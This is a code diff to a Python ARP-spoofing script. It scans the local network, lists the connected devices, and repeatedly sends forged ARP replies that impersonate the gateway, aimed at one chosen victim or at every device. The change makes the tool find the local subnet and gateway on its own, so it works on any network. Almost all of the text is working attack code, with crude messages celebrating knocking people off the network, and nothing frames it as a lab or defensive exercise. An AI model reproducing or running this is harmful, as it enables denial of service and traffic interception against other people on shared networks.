@@ -15,10 +15,28 @@ def get_ip_macs(ips):
 def poison(victim_ip, victim_mac, gateway_ip):
   packet = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac)
   send(packet, verbose=0)
+
+def get_lan_ip():
+  # Pretty hacky and requires internet access, but it works
+  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  s.connect(("google.com", 80))
+  ip = s.getsockname()
+  s.close()
+  return ip[0]
   
 refreshing = True
 while refreshing:
-  devices = get_ip_macs('10.0.0.*')
+  # Find out what IPs to scan
+  myip = get_lan_ip()
+  ip_list = myip.split('.')
+  del ip_list[-1]
+  ip_list.append('*')
+  ip_range = '.'.join(ip_list)
+  del ip_list[-1]
+  ip_list.append('1')
+  gateway_ip = '.'.join(ip_list)
+
+  devices = get_ip_macs(ip_range)
   print "Connected guys:"
   i = 0
   for device in devices:
@@ -52,14 +70,14 @@ if choice.isdigit():
   print "Fucking %s..." % victim[0]
   try:
     while True:
-      poison(victim[0], victim[1], '10.0.0.1')
+      poison(victim[0], victim[1], gateway_ip)
   except KeyboardInterrupt:
       print 'You\'re welcome!'
 elif killall:
   try:
     while True:
       for victim in devices:
-        poison(victim[0], victim[1], '10.0.0.1')
+        poison(victim[0], victim[1], gateway_ip)
   except KeyboardInterrupt:
     print 'You\'re welcome!'
     
